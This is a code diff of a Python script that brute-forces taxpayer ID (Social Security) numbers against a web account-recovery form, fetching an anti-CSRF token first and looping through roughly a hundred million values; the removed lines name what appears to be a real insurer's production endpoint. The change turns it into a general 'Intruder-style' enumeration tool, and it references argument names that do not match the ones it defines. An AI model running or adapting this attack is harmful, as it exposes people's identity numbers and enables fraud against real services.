@@ -5,17 +5,26 @@
 #####################
 
 try:
-	import requests
-	import lxml.html as lh
-	from io import StringIO
-except ImportError, e:
-	print "Exception: {}".format(str(e))
-	exit(1)
+    import requests
+    import lxml.html as lh
+    from io import StringIO
+    import argparse
 
-def get_token(session, url):
+except ImportError, e:
+    print "Exception: {}".format(str(e))
+    exit(1)
+
+ap = argparse.ArgumentParser(description='"Intruder-style requests with pre-fetch of Anti-CSRF token.')
+ap.add_argument('p_url', type=str, help='URL to post data to once you have token')
+ap.add_argument('--t_url', '-t', help='url to get token from')
+ap.add_argument('--tokenName', '-n', help='name of token')
+args = ap.parse_args()
+
+def get_token(session, url, tokenName):
     gr = session.get(url, verify=False)
     tree = lh.fromstring(gr.content)
-    token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
+    #token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
+    token = tree.xpath('//input[@name="%s"]/@value' %tokenName)[0]
     return token
 
 def post_ssn(session, url, data):
@@ -33,7 +42,8 @@ def post_ssn(session, url, data):
 
 def main():
     #url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
-    url = 'https://service.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
+    t_url = args.tokenURL
+    p_url = args.postURL
     token = str()
     #proxies = { 'https': 'http://172.21.22.204:8080' }	#for testing
 
@@ -41,7 +51,7 @@ def main():
     s = requests.Session()
 
     if not token:
-        token = get_token(s, url)
+        token = get_token(s, t_url, args.tokenName)
 
     for i in xrange(342356633, 444444444):
         data = {'org.apache.struts.taglib.html.TOKEN':token,
@@ -50,7 +60,7 @@ def main():
                 'clientDOB':'1%2F1%2F2000',
                 'taxPayerId':str(i),
                 'emailAddress':'matt%40matt.com'}
-        post_ssn(s, url, data) 
+        post_ssn(s, p_url, data) 
 
 if __name__ == '__main__':
     main()
